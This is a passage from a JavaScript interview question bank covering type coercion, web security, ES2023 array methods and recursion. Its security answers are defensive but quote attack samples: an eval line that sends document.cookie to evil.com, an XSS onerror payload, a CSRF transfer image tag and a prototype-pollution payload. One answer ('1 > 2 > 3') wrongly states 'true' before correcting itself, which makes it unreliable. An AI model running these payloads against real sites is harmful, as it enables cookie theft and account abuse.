   a:"The <strong>optional chaining</strong> operator (<code>?.</code>) short-circuits and returns <code>undefined</code> if the value before it is <code>null</code> or <code>undefined</code>, instead of throwing a TypeError.<br><pre>const user = { profile: { address: { city: 'NYC' } } };\n\n// Without optional chaining\nconst city = user && user.profile && user.profile.address && user.profile.address.city;\n\n// With optional chaining\nconst city2 = user?.profile?.address?.city; // 'NYC'\nconst zip   = user?.profile?.address?.zip;  // undefined (no error)\n\n// Methods\nconst len = str?.trim()?.length;\n\n// Arrays\nconst first = arr?.[0];\n\n// Functions\nonClick?.(); // calls if onClick is defined</pre>"}
);


// ── BATCH 4-L: Output-Based / Tricky Questions ───────────────────────────────
SEC_JS.qs.push(
  {q:"What is the output of `0.1 + 0.2 === 0.3`? Why?",d:"medium",
   a:"<strong>Output: false</strong><br><br>Floating-point numbers in JavaScript (IEEE 754 double precision) cannot represent 0.1 and 0.2 exactly — leading to rounding errors.<br><pre>0.1 + 0.2; // 0.30000000000000004\n0.1 + 0.2 === 0.3; // false!\n\n// Fix 1: use toFixed for display\n(0.1 + 0.2).toFixed(1) === '0.3'; // true (string comparison)\n\n// Fix 2: compare with epsilon\nMath.abs((0.1 + 0.2) - 0.3) < Number.EPSILON; // true\n\n// Fix 3: multiply to integers, then divide\n(1 + 2) / 10 === 0.3; // true (1 + 2 = 3, 3/10 = 0.3)</pre><br><strong>Rule:</strong> never use <code>===</code> to compare floating-point results — use epsilon comparison or fixed-decimal libraries."},

  {q:"What is the output of `typeof null`? Why is it 'object'?",d:"medium",
   a:"<strong>Output: 'object'</strong><br><br>This is a <strong>historical bug</strong> in JavaScript (present since its first version in 1995). In the original implementation, values were stored as a type tag + value. The type tag for objects was 0, and <code>null</code> was represented as a null pointer (0x00) — so it shared the object type tag.<br><pre>typeof null;        // 'object' ← bug, not a feature\ntypeof undefined;   // 'undefined'\ntypeof {};          // 'object'\n\n// The bug was never fixed to avoid breaking existing code\n// Correct way to check for null:\nvalue === null;                           // true only for null\nvalue == null;                            // true for null AND undefined</pre>"},

  {q:"What is the output of `[] == false`? Explain type coercion.",d:"hard",
   a:"<strong>Output: true</strong><br><br>The <code>==</code> operator performs a series of coercions:<ol><li><code>false</code> → <code>0</code> (boolean to number)</li><li><code>[]</code> → <code>''</code> (array to primitive via .toString())</li><li><code>''</code> → <code>0</code> (string to number)</li><li><code>0 == 0</code> → <strong>true</strong></li></ol><pre>[] == false // true\n[] == 0     // true ([] → '' → 0)\n'' == false // true ('' → 0, false → 0)\n[] == ''    // true ([] → '')\nnull == false // false (null only == null/undefined)\n\n// Related coercions\n+[]    // 0\n+{}    // NaN\n+null  // 0\n+true  // 1\n+false // 0</pre><br><strong>Lesson:</strong> always use <code>===</code> to avoid these surprising coercions."},

  {q:"What is the output of `[10, 5, 1].sort()`? Why is it wrong?",d:"medium",
   a:"<strong>Output: [1, 10, 5]</strong> — wrong for numbers!<br><br>Without a comparator, <code>Array.sort()</code> converts elements to <strong>strings</strong> and sorts lexicographically. So '10' comes before '5' because '1' < '5'.<br><pre>[10, 5, 1].sort();              // [1, 10, 5]  — WRONG\n['b','a','c'].sort();           // ['a','b','c'] — correct for strings\n\n// Correct numeric sort:\n[10, 5, 1].sort((a, b) => a - b); // [1, 5, 10]  ascending\n[10, 5, 1].sort((a, b) => b - a); // [10, 5, 1]  descending</pre>"},

  {q:"What does `1 > 2 > 3` evaluate to and why?",d:"medium",
   a:"<strong>Output: true</strong><br><br>Comparison operators are left-associative, so this is evaluated as <code>(1 > 2) > 3</code>:<ol><li><code>1 > 2</code> → <code>false</code></li><li><code>false > 3</code> → <code>0 > 3</code> (boolean coerced to number) → <code>false</code></li></ol>Wait — let's recheck: <code>false > 3</code> → <code>0 > 3</code> → <strong>false</strong>. But <code>3 > 2 > 1</code> → <code>true > 1</code> → <code>1 > 1</code> → <strong>false</strong>!<br><pre>1 > 2 > 3  // → false > 3 → 0 > 3 → false\n3 > 2 > 1  // → true  > 1 → 1 > 1 → false\n3 > 2 > 0  // → true  > 0 → 1 > 0 → true\n\n// Never chain comparisons this way in JS!\n// Use explicit: x > 1 && x < 10</pre>"},

  {q:"What is the output of `'5' + 3 + 2` vs `5 + 3 + '2'`?",d:"easy",
   a:"<strong>Output: '532' and '82'</strong><br><br>The <code>+</code> operator is both addition (numbers) and concatenation (strings). When one operand is a string, it converts the other to a string — and evaluation is left-to-right.<br><pre>'5' + 3 + 2 // '5' + 3 → '53' + 2 → '532'\n5 + 3 + '2' // 5 + 3 = 8 → 8 + '2' → '82'\n\n// More examples:\n1 + 2 + '3' // 3 + '3' → '33'\n'3' + 2 + 1 // '32' + 1 → '321'\n\n// Subtract has no string form — converts to number\n'5' - 3      // 2 (coercion to number)\n'5' * '3'    // 15</pre>"},

  {q:"What is the output of `typeof undefined === typeof null`?",d:"hard",
   a:"<strong>Output: false</strong><br><br><pre>typeof undefined // 'undefined'\ntypeof null      // 'object' (historical bug)\n\n'undefined' === 'object' // false</pre><br><strong>Follow-up tricky question:</strong><br><pre>typeof typeof 42  // 'string' — typeof always returns a string</pre>"},

  {q:"What is the output of a setTimeout inside a for loop with var?",d:"hard",
   a:"<strong>Output: 3, 3, 3</strong> (not 0, 1, 2)<br><br><code>var</code> is function-scoped — there is only ONE <code>i</code> shared by all callbacks. By the time the callbacks run (after loop ends), <code>i</code> is already 3.<br><pre>for (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100);\n}\n// Output: 3, 3, 3\n\n// Fix 1: use let (block-scoped — new i per iteration)\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100); // 0, 1, 2\n}\n\n// Fix 2: IIFE to capture i\nfor (var i = 0; i < 3; i++) {\n  (function(j) {\n    setTimeout(() => console.log(j), 100);\n  })(i);\n}\n\n// Fix 3: pass i to setTimeout\nfor (var i = 0; i < 3; i++) {\n  setTimeout(console.log, 100, i); // extra args passed to fn\n}</pre>"},

  {q:"What is the difference between `null == undefined` and `null === undefined`?",d:"medium",
   a:"<pre>null == undefined   // true  — special case in the spec\nnull === undefined  // false — different types (null vs undefined)</pre><br>The <strong>loose equality</strong> spec has a special rule: <code>null</code> and <code>undefined</code> are only loosely equal to each other — not to any other value.<br><pre>null == 0       // false (null only == null/undefined)\nnull == false   // false\nnull == ''      // false\n\n// Useful pattern: check for both null and undefined\nif (value == null) {  // catches BOTH null and undefined\n  console.log('no value');\n}</pre>"},

  {q:"What does `+[]`, `+{}`, and `+![]` evaluate to?",d:"hard",
   a:"<strong>Outputs: 0, NaN, 0</strong><br><pre>+[]   // 0\n      // [] → '' (toString) → 0 (toNumber)\n\n+{}   // NaN\n      // {} → '[object Object]' (toString) → NaN (toNumber)\n\n+![]  // 0\n      // ![] → false ([] is truthy, so ![] is false) → +false → 0\n</pre><br><strong>More type coercion fun:</strong><br><pre>[] + []   // '' (both → '')\n[] + {}   // '[object Object]'\n{} + []   // 0 (if {} is a block, not object — context matters!)</pre><br><strong>Lesson:</strong> JavaScript's type coercion with <code>+</code> can be very surprising — use explicit conversions like <code>Number()</code> or <code>String()</code>."},

  {q:"What is the output of `parseInt('010')` in modern JavaScript?",d:"medium",
   a:"<strong>Output: 10</strong> (in modern JS, ES5+)<br><br>In older JS engines, the <code>0</code> prefix caused octal parsing (base 8), so <code>'010'</code> → 8. ES5 changed the default radix to 10 for decimal strings.<br><pre>// Modern JS (ES5+)\nparseInt('010');     // 10 (decimal)\nparseInt('010', 8);  // 8  (explicit octal)\nparseInt('010', 16); // 16 (explicit hex)\n\n// Always specify radix to be safe:\nparseInt('10', 10);  // 10\nparseInt('ff', 16);  // 255\nparseInt('0b10', 2); // 0 (parseInt doesn't handle 0b prefix)\nNumber('0b10');      // 2 (Number() does!)</pre>"},

  {q:"What is the output of chained setTimeout with closures using var?",d:"hard",
   a:"This tests understanding of closures, var hoisting, and async execution:<br><pre>function createFunctions() {\n  const result = [];\n  for (var i = 0; i < 3; i++) {\n    result.push(function() { return i; });\n  }\n  return result;\n}\nconst fns = createFunctions();\nfns[0](); // 3 — not 0!\nfns[1](); // 3\nfns[2](); // 3\n// All share same 'i' (var — function scope), which is 3 after loop\n\n// Fix with let:\nfor (let i = 0; i < 3; i++) {\n  result.push(function() { return i; });\n}\nfns[0](); // 0\nfns[1](); // 1\nfns[2](); // 2</pre>"}
);


// ── BATCH 4-M: Security in JavaScript ────────────────────────────────────────
SEC_JS.qs.push(
  {q:"What is XSS (Cross-Site Scripting) and how do you prevent it?",d:"hard",
   a:"<strong>XSS</strong> is an attack where malicious scripts are injected into web pages viewed by other users.<br><br><strong>Types:</strong><ul><li><strong>Stored XSS</strong> — malicious script saved in DB, served to all users</li><li><strong>Reflected XSS</strong> — script in URL parameter reflected in response</li><li><strong>DOM-based XSS</strong> — script injected via client-side DOM manipulation</li></ul><br><strong>Prevention:</strong><br><pre>// NEVER do this with user input:\ndiv.innerHTML = userInput; // XSS vulnerability!\n\n// Safe alternatives:\ndiv.textContent = userInput; // escapes HTML automatically\ndiv.innerText   = userInput;\n\n// If you must use HTML — sanitize first:\nimport DOMPurify from 'dompurify';\ndiv.innerHTML = DOMPurify.sanitize(userInput);</pre><br><strong>Also:</strong> use Content Security Policy (CSP) headers, HTTPOnly cookies, and validate/encode all outputs."},

  {q:"What is the difference between innerHTML and textContent for security?",d:"medium",
   a:"<strong><code>innerHTML</code></strong> parses and renders HTML — a security risk if used with untrusted input (XSS).<br><strong><code>textContent</code></strong> treats the value as plain text — safely escapes all HTML tags.<br><pre>const userInput = '&lt;img src=x onerror=\"alert(1)\"&gt;';\n\n// DANGEROUS:\ndiv.innerHTML = userInput; // script executes!\n\n// SAFE:\ndiv.textContent = userInput; // renders as plain text\n// displays literally: &lt;img src=x onerror=\"alert(1)\"&gt;\n\n// Also safe:\ndiv.innerText = userInput;</pre><br><strong>Rule:</strong> use <code>textContent</code> for user-provided data. Only use <code>innerHTML</code> with trusted/sanitized content."},

  {q:"What is Content Security Policy (CSP)?",d:"hard",
   a:"<strong>CSP</strong> is an HTTP response header that restricts what resources (scripts, styles, images) a browser is allowed to load — a defence-in-depth against XSS.<br><pre>// HTTP Header\nContent-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'\n\n// Meta tag (limited)\n&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'\"&gt;\n\n// Directives:\n// default-src 'self'     — only load from same origin\n// script-src 'nonce-xyz' — only inline scripts with matching nonce\n// img-src *              — images from anywhere\n// frame-ancestors 'none' — disallow being framed (prevents clickjacking)</pre><br><strong>CSP prevents:</strong> inline script injection, loading scripts from attacker domains, data exfiltration."},

  {q:"What is CSRF and how do you prevent it?",d:"hard",
   a:"<strong>CSRF</strong> (Cross-Site Request Forgery) tricks an authenticated user's browser into making an unwanted request to your server.<br><br><strong>Attack scenario:</strong> User is logged into bank.com. Attacker sends email with link to evil.com which has <code>&lt;img src=\"bank.com/transfer?to=attacker&amp;amount=1000\"&gt;</code>. The browser sends the bank's cookie automatically.<br><br><strong>Prevention:</strong><br><pre>// 1. CSRF Token — unique per-session token in forms\n&lt;form method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"_csrf\" value=\"{token}\"&gt;\n&lt;/form&gt;\n// Server validates token on each POST/PUT/DELETE\n\n// 2. SameSite Cookie attribute\n// Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly\n// SameSite=Strict — never sent cross-site\n// SameSite=Lax    — sent on top-level navigation only\n\n// 3. Check Origin/Referer headers on server</pre>"},

  {q:"Why should you avoid storing auth tokens in localStorage?",d:"medium",
   a:"<code>localStorage</code> is accessible by <strong>any JavaScript on the page</strong> — including injected scripts from XSS attacks.<br><pre>// Attacker can steal your token:\nlocalStorage.getItem('authToken'); // trivial via XSS</pre><br><strong>Safer alternatives:</strong><br><pre>// HttpOnly cookies — NOT accessible from JS at all\n// Set by server:\nSet-Cookie: token=abc; HttpOnly; Secure; SameSite=Strict\n\n// Client JS cannot read it:\ndocument.cookie; // won't show HttpOnly cookies</pre><br><strong>Summary:</strong><table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Storage</th><th style='padding:4px 8px'>XSS risk</th><th style='padding:4px 8px'>CSRF risk</th></tr><tr><td style='padding:4px 8px'>localStorage</td><td style='padding:4px 8px'>High</td><td style='padding:4px 8px'>Low (not auto-sent)</td></tr><tr><td style='padding:4px 8px'>HttpOnly Cookie</td><td style='padding:4px 8px'>Low</td><td style='padding:4px 8px'>Medium (auto-sent, mitigate with SameSite)</td></tr></table>"},

  {q:"What is the same-origin policy?",d:"medium",
   a:"The <strong>same-origin policy</strong> restricts how a document or script from one origin can interact with resources from another origin.<br><br><strong>Origin = protocol + host + port</strong><br><pre>// Same origin:\nhttps://example.com/page1\nhttps://example.com/api/data\n\n// Different origin:\nhttp://example.com   // different protocol\nhttps://api.example.com // different subdomain\nhttps://example.com:8080 // different port</pre><br><strong>What it restricts:</strong> fetch/XHR to different origins, DOM access across iframes from different origins.<br><br><strong>CORS</strong> (Cross-Origin Resource Sharing) allows servers to explicitly permit cross-origin requests via headers:<br><pre>// Server response header:\nAccess-Control-Allow-Origin: https://yoursite.com\nAccess-Control-Allow-Methods: GET, POST</pre>"},

  {q:"What are the security risks of using eval()?",d:"medium",
   a:"<code>eval()</code> executes a string as JavaScript code — making it extremely dangerous with untrusted input.<br><pre>// NEVER do this:\nconst userInput = prompt('Enter code:');\neval(userInput); // attacker can run ANY code!\n\n// Attack example:\neval(\"fetch('https://evil.com?c=\"+document.cookie)\")</pre><br><strong>Risks:</strong><ul><li><strong>Code injection</strong> — attacker can execute arbitrary JS</li><li><strong>Data theft</strong> — steal cookies, localStorage, DOM data</li><li><strong>Performance</strong> — prevents V8 optimizations</li><li><strong>Scope access</strong> — eval has access to the surrounding scope</li></ul><br><strong>Alternatives:</strong><br><pre>// Instead of eval for JSON parsing:\nJSON.parse(jsonString); // safe\n\n// Instead of eval for math:\nnew Function('return ' + expr)(); // isolated scope (but still risky)</pre>"},

  {q:"What is prototype pollution and how do you prevent it?",d:"hard",
   a:"<strong>Prototype pollution</strong> is an attack where a malicious input modifies <code>Object.prototype</code>, affecting ALL objects in the application.<br><pre>// Attack: if your code does deep merge of user input\nfunction merge(target, source) {\n  for (const key in source) {\n    if (typeof source[key] === 'object') {\n      merge(target[key], source[key]);\n    } else {\n      target[key] = source[key]; // DANGEROUS!\n    }\n  }\n}\n\n// Malicious payload:\nmerge({}, JSON.parse('{\"__proto__\":{\"admin\":true}}'));\n// Now EVERY object has .admin = true!\nconsole.log({}.admin); // true — pollution!</pre><br><strong>Prevention:</strong><br><pre>// 1. Check for dangerous keys\nif (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n  continue;\n}\n\n// 2. Use Object.create(null) as accumulator (no prototype)\nconst safe = Object.create(null);\n\n// 3. Use structuredClone or libraries with safe merge (lodash 4.17.21+)</pre>"},

  {q:"What is clickjacking and how do you prevent it?",d:"medium",
   a:"<strong>Clickjacking</strong> tricks users into clicking on hidden elements by overlaying a transparent iframe over a legitimate button.<br><br><strong>Attack:</strong> attacker embeds your site in an iframe, overlays a fake button, user thinks they're clicking the fake button but clicks your real hidden button (e.g., 'Transfer Money').<br><br><strong>Prevention:</strong><br><pre>// 1. X-Frame-Options header (older)\nX-Frame-Options: DENY            // never frame\nX-Frame-Options: SAMEORIGIN      // only same origin can frame\n\n// 2. CSP frame-ancestors (modern, preferred)\nContent-Security-Policy: frame-ancestors 'none';\nContent-Security-Policy: frame-ancestors 'self' https://trusted.com;\n\n// 3. JS frame-busting (weak, easily bypassed)\nif (window.top !== window.self) {\n  window.top.location = window.location;\n}</pre>"},

  {q:"What is input sanitization and why is it critical?",d:"medium",
   a:"<strong>Input sanitization</strong> is the process of cleaning or encoding user-provided data before using it — preventing injection attacks (XSS, SQL injection, command injection).<br><pre>// XSS via unsanitized HTML\ndiv.innerHTML = userComment; // DANGEROUS if comment has &lt;script&gt; tags\n\n// Fix — sanitize or use textContent\nimport DOMPurify from 'dompurify';\ndiv.innerHTML = DOMPurify.sanitize(userComment);\n\n// Email validation\nconst emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\nif (!emailRegex.test(email)) throw new Error('Invalid email');\n\n// Number validation\nconst age = parseInt(input.age, 10);\nif (isNaN(age) || age < 0 || age > 150) throw new RangeError('Invalid age');</pre><br><strong>Key principle:</strong> never trust user input — validate on both client (UX) and server (security)."}
);


// ── BATCH 4-N: ES2022–2024 Modern Features ───────────────────────────────────
SEC_JS.qs.push(
  {q:"What are Array.prototype.toReversed(), toSorted(), and toSpliced()?",d:"medium",
   a:"ES2023 introduced <strong>non-mutating array methods</strong> — they return a new array instead of modifying the original.<br><pre>const arr = [3, 1, 2];\n\n// toReversed — reversed copy (reverse() mutates)\nconst rev = arr.toReversed(); // [2, 1, 3]\nconsole.log(arr);             // [3, 1, 2] — unchanged\n\n// toSorted — sorted copy (sort() mutates)\nconst sorted = arr.toSorted((a, b) => a - b); // [1, 2, 3]\nconsole.log(arr);                              // [3, 1, 2] — unchanged\n\n// toSpliced — spliced copy (splice() mutates)\nconst spliced = arr.toSpliced(1, 1, 99); // [3, 99, 2]\nconsole.log(arr);                        // [3, 1, 2] — unchanged</pre><br>These are especially useful in functional/immutable programming patterns."},

  {q:"What are Array.prototype.findLast() and findLastIndex()?",d:"easy",
   a:"ES2023 added <strong>reverse search</strong> methods — like <code>find()</code> and <code>findIndex()</code> but searching from the end of the array.<br><pre>const nums = [1, 2, 3, 4, 3, 2, 1];\n\n// find searches from start\nnums.find(x => x > 2);          // 3 (first match at index 2)\n\n// findLast searches from end\nnums.findLast(x => x > 2);      // 3 (last match at index 4)\n\nnums.findLastIndex(x => x > 2); // 4 (index of last match)\n\nconst events = [\n  { type: 'login',  user: 'Alice' },\n  { type: 'click',  user: 'Bob'   },\n  { type: 'logout', user: 'Alice' }\n];\n// Find most recent Alice event\nevents.findLast(e => e.user === 'Alice'); // { type:'logout', user:'Alice' }</pre>"},

  {q:"What is Array.prototype.with()?",d:"easy",
   a:"<code>Array.prototype.with(index, value)</code> (ES2023) returns a <strong>new array</strong> with the element at the given index replaced — a non-mutating alternative to direct index assignment.<br><pre>const arr = [1, 2, 3, 4, 5];\n\n// Old (mutates):\narr[2] = 99;\n\n// with() — non-mutating\nconst newArr = arr.with(2, 99); // [1, 2, 99, 4, 5]\nconsole.log(arr); // [1, 2, 3, 4, 5] — unchanged\n\n// Negative index (counts from end)\narr.with(-1, 99); // [1, 2, 3, 4, 99]\n\n// Useful in functional patterns\nconst updated = state.items.with(selectedIndex, newItem);</pre>"},

  {q:"What is Promise.withResolvers()?",d:"medium",
   a:"<code>Promise.withResolvers()</code> (ES2024) returns an object with <code>{ promise, resolve, reject }</code> — a cleaner way to create a promise whose resolution is controlled externally.<br><pre>// Old pattern (resolve/reject escape hatch)\nlet resolve, reject;\nconst promise = new Promise((res, rej) => {\n  resolve = res;\n  reject = rej;\n});\n// Awkward — must declare vars outside Promise constructor\n\n// New (ES2024)\nconst { promise, resolve, reject } = Promise.withResolvers();\n\n// Use case: externally resolvable promise\nbtn.addEventListener('click', () => resolve('clicked!'));\npromise.then(result => console.log(result)); // 'clicked!'</pre>"},

  {q:"What is the Array/String at() method?",d:"easy",
   a:"<code>.at(index)</code> (ES2022) accesses elements by index — supporting <strong>negative indices</strong> to count from the end, unlike bracket notation.<br><pre>const arr = [1, 2, 3, 4, 5];\n\narr.at(0);   // 1  (first)\narr.at(-1);  // 5  (last)\narr.at(-2);  // 4  (second-to-last)\n\n// Old way to get last element (verbose):\narr[arr.length - 1]; // 5\n\n// String\n'hello'.at(-1);  // 'o' (last character)\n'hello'.at(0);   // 'h'\n\n// Works on TypedArrays too\nnew Int32Array([10, 20, 30]).at(-1); // 30</pre>"},

  {q:"What is Object.hasOwn() and how is it different from hasOwnProperty?",d:"medium",
   a:"<code>Object.hasOwn(obj, key)</code> (ES2022) checks if an object has a property as its <strong>own</strong> (not inherited) property — a safer replacement for <code>.hasOwnProperty()</code>.<br><pre>const obj = { name: 'Alice' };\n\n// Old way — can fail if object has no prototype or overrides hasOwnProperty\nobj.hasOwnProperty('name'); // true\n\n// Problem 1: Object.create(null) has no hasOwnProperty\nconst bare = Object.create(null);\nbare.x = 1;\nbare.hasOwnProperty('x'); // TypeError!\n\n// Problem 2: overridden hasOwnProperty\nconst evil = {\n  hasOwnProperty: () => true, // always returns true\n};\nevil.hasOwnProperty('fake'); // true (wrong!)\n\n// Fix — use Object.hasOwn (static, always safe)\nObject.hasOwn(bare, 'x');    // true\nObject.hasOwn(evil, 'fake'); // false (correct!)</pre>"},

  {q:"What is the Error cause property (ES2022)?",d:"medium",
   a:"ES2022 added a <strong><code>cause</code></strong> option to <code>Error</code> constructor for error chaining — preserving the original error when re-throwing.<br><pre>// Before ES2022 — cause lost or stuffed into message\ntry {\n  await fetchData();\n} catch (err) {\n  throw new Error('Failed to load user: ' + err.message); // loses stack trace\n}\n\n// ES2022 — pass original error as cause\ntry {\n  await fetchData();\n} catch (err) {\n  throw new Error('Failed to load user', { cause: err });\n}\n\n// Access the cause\ntry {\n  loadUser();\n} catch (err) {\n  console.log(err.message); // 'Failed to load user'\n  console.log(err.cause);   // original error with full stack</pre>"},

  {q:"What are String.prototype.isWellFormed() and toWellFormed()?",d:"hard",
   a:"ES2024 methods to handle <strong>lone Unicode surrogates</strong> — incomplete surrogate pairs that are technically invalid Unicode.<br><pre>// Lone surrogate — invalid Unicode\nconst bad = '\\uD800'; // lone high surrogate (no pair)\n\nbad.isWellFormed();   // false\n'hello'.isWellFormed(); // true\n\n// toWellFormed — replaces lone surrogates with U+FFFD (replacement char)\nbad.toWellFormed();   // '\uFFFD' (replacement character)\n\n// Why it matters:\n// encodeURIComponent(bad) — throws URIError!\n// encodeURIComponent(bad.toWellFormed()) — works safely\n\n// Practical use: sanitize strings before URL encoding or JSON\nfunction safeEncode(str) {\n  return encodeURIComponent(str.toWellFormed());\n}</pre>"}
);


// ── BATCH 5: Function Fundamentals & Control Flow ────────────────────────────
SEC_JS.qs.push(
  {q:"What is the `arguments` object and how does it differ from rest parameters?",d:"medium",
   a:"The <code>arguments</code> object is an <strong>array-like</strong> (not real array) object available in regular functions containing all passed arguments.<br><pre>function test(a, b) {\n  console.log(arguments);     // [1, 2, 3] (array-like)\n  console.log(arguments[0]);  // 1\n  console.log(arguments.length); // 3\n}\ntest(1, 2, 3);\n\n// Arrow functions do NOT have arguments\nconst arrow = () => console.log(arguments); // ReferenceError</pre><br><strong>Rest parameters vs arguments:</strong><br><pre>// Rest — real array, named parameters\nfunction sum(...nums) { return nums.reduce((a,b)=>a+b, 0); }\n\n// arguments — array-like, all params\nfunction sum2() {\n  return [...arguments].reduce((a,b)=>a+b, 0); // must convert\n}</pre><br><strong>Converting arguments to array:</strong><br><pre>Array.from(arguments);\nArray.prototype.slice.call(arguments);\n[...arguments];</pre>"},

  {q:"What is Function.prototype.length and how is it used?",d:"medium",
   a:"<code>function.length</code> returns the number of <strong>formal parameters</strong> (not including rest parameters).<br><pre>function test(a, b, c) {}
test.length; // 3\n\nfunction withRest(a, b, ...rest) {}
withRest.length; // 2 — rest parameter NOT counted!\n\nfunction withDefaults(a, b = 10, c) {}
withDefaults.length; // 1 — only 'a' (params after first default not counted!)\n\n// Use case: checking function arity (expected arguments)\nfunction validateArgs(fn, ...args) {\n  if (args.length < fn.length) throw new Error('Not enough arguments');\n}</pre>"},

  {q:"What is a constructor function and how does the `new` keyword work?",d:"medium",
   a:"A <strong>constructor function</strong> is a regular function called with <code>new</code> that creates and initialises a new object.<br><br><code>new</code> does 4 things:<ol><li>Create empty object</li><li>Set its prototype to constructor.prototype</li><li>Call constructor with <code>this</code> = new object</li><li>Return the object (unless constructor returns an object)</li></ol><pre>function User(name, age) {\n  this.name = name;\n  this.age = age;\n}\nUser.prototype.greet = function() { return 'Hi, ' + this.name; };\n\nconst u = new User('Alice', 30);\nconsole.log(u.name);    // 'Alice'\nconsole.log(u.greet()); // 'Hi, Alice'\nconsole.log(u instanceof User); // true\n\n// Without new — 'this' is window/global\nconst u2 = User('Bob', 25); // window.name = 'Bob' — oops!</pre>"},

  {q:"What are the different ways to invoke a function?",d:"medium",
   a:"<ol><li><strong>Direct function call:</strong> <code>this</code> = undefined (strict) or window (non-strict)</li><li><strong>Method call:</strong> <code>this</code> = object calling the method</li><li><strong>Constructor call (new):</strong> <code>this</code> = new object</li><li><strong>Explicit binding (call/apply/bind):</strong> <code>this</code> = specified object</li></ol><pre>const obj = { name: 'obj' };\nfunction greet() { return this.name; }\n\n// 1. Direct call\ngreet(); // undefined / 'window'\n\n// 2. Method\nobj.greet = greet;\nobj.greet(); // 'obj'\n\n// 3. Constructor\nconst o = new greet(); // new object\n\n// 4. Explicit\ngreet.call(obj);       // 'obj'\ngreet.apply(obj, []);  // 'obj'\nconst bound = greet.bind(obj);\nbound(); // 'obj'</pre>"},

  {q:"What is recursion and what is tail call optimization (TCO)?",d:"hard",
   a:"<strong>Recursion:</strong> a function calling itself to solve a problem by breaking it into smaller subproblems.<br><pre>function factorial(n) {\n  if (n <= 1) return 1;\n  return n * factorial(n - 1); // recursive call\n}\nfactorial(5); // 120</pre><br><strong>Problem: stack overflow</strong> with deep recursion (call stack fills up).<br><br><strong>Tail Call Optimization (TCO):</strong> when the recursive call is the last statement, the compiler/engine can reuse the current stack frame instead of creating a new one.<br><pre>// NOT tail-recursive (does multiplication after recursive call)\nfunction fac(n) { return n <= 1 ? 1 : n * fac(n-1); }\n\n// Tail-recursive (accumulator pattern)\nfunction facTail(n, acc = 1) {\n  return n <= 1 ? acc : facTail(n - 1, n * acc);\n}\nfacTail(10000); // safe from stack overflow (in ES6-compliant engines)</pre><br><strong>Note:</strong> TCO is optional in ECMAScript; not guaranteed in all engines (not in V8/Chrome!)."},

  {q:"What is the difference between direct and mutual recursion?",d:"medium",
   a:"<strong>Direct recursion:</strong> function calls itself.<br><strong>Mutual recursion:</strong> function A calls B, B calls A.<br><pre>// Direct\nfunction countdown(n) {\n  if (n <= 0) return;\n  console.log(n);\n  countdown(n - 1);\n}\n\n// Mutual\nfunction isEven(n) {\n  return n === 0 ? true : isOdd(n - 1);\n}\nfunction isOdd(n) {\n  return n === 0 ? false : isEven(n - 1);\n}</pre>"},

  {q:"What causes a stack overflow in recursion and how do you prevent it?",d:"hard",
   a:"<strong>Stack overflow:</strong> call stack runs out of memory when recursion depth exceeds the limit (~10,000-15,000 frames).<br><pre>// Causes RangeError: Maximum call stack size exceeded\nfunction infinite() { return infinite(); }\ninfinite();\n\nfunction deep(n) {\n  if (n === 0) return;\n  deep(n + 1); // goes infinitely\n}</pre><br><strong>Prevention strategies:</strong><ol><li><strong>Proper base case:</strong> ensure recursion terminates</li><li><strong>Tail call optimization:</strong> restructure as tail-recursive (if engine supports TCO)</li><li><strong>Iteration:</strong> convert recursion to loops</li><li><strong>Trampolining:</strong> return functions instead of recursing, then execute iteratively</li><li><strong>Memoization:</strong> cache results to reduce recursive calls</li></ol><pre>// Convert to iteration\nfunction countdownIter(n) {\n  while (n > 0) console.log(n--);\n}\n\n// Trampolining\nfunction trampoline(f) {\n  while (typeof f === 'function') f = f();\n  return f;\n}\n\nfunction countdown2(n) {\n  return n <= 0 ? n : () => countdown2(n - 1);\n}\ntrampoline(countdown2(10000)); // safe</pre>"},

  {q:"What is memoization with multiple arguments?",d:"hard",
   a:"<strong>Memoization with multiple arguments:</strong> cache results using all arguments as the key (not just one).<br><pre>// Simple (single arg)\nconst memo1 = {};\nconst fib = n => {\n  if (memo1[n]) return memo1[n];\n  if (n <= 1) return n;\n  return (memo1[n] = fib(n-1) + fib(n-2));\n};\n\n// Multiple args — use JSON.stringify or tuple as key\nconst memo2 = {};\nfunction add(a, b) {\n  const key = JSON.stringify([a, b]);\n  if (memo2[key]) return memo2[key];\n  return (memo2[key] = a + b);\n}\n\n// Generic memoizer\nfunction memoize(fn) {\n  const cache = new Map();\n  return function(...args) {\n    const key = JSON.stringify(args);\n    if (cache.has(key)) return cache.get(key);\n    const result = fn.apply(this, args);\n    cache.set(key, result);\n    return result;\n  };\n}\n\nconst expensiveFn = memoize((a, b, c) => a*b*c);\nexpensiveFn(2, 3, 4); // computes\nexpensiveFn(2, 3, 4); // cached</pre>"},

  {q:"What are IIFE variations and patterns?",d:"hard",
   a:"<strong>IIFE variations:</strong><br><pre>// Standard\n(function() { console.log('IIFE'); })();\n\n// Arrow\n(() => console.log('Arrow IIFE'))();\n\n// With arguments\n(function(msg) { console.log(msg); })('Hello');\n\n// With return value\nconst result = (function() { return 42; })();\n\n// Async IIFE\n(async function() {\n  const data = await fetch('/api');\n})();\n\n// Alternative syntax (Crockford style)\n(function() { /* code */ }());\n!function() { /* code */ }();\n+function() { /* code */ }();\n~function() { /* code */ }();</pre><br><strong>Use cases:</strong> avoid global namespace pollution, create private scope, initialisation code."},

  {q:"What are generator function edge cases?",d:"hard",
